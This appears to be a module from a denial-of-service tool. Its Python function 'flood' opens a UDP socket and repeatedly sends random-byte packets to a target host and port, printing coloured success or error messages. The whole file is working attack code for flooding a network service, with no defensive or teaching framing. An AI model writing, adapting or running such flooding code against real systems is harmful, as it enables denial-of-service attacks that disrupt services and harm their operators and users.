# Import modules
import random
import socket
from stringcolor import *

red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"
blue = "\033[38;5;51m"

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def flood(target):
    for _ in range(16):
        try:
            payload = random._urandom(random.randint(1, 60))
            sock.sendto(payload, (target[0], target[1]))
        except Exception as e:
            print(
                f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('while sending UDP packet', yellow)}\n{e}"
            )
        else:
            print(
                f"{cs(f'[✔] SUCCESS', green)} {cs(f'UDP random packet sent! Payload size:', yellow)} {blue}{len(payload)}\033[0m"
            )
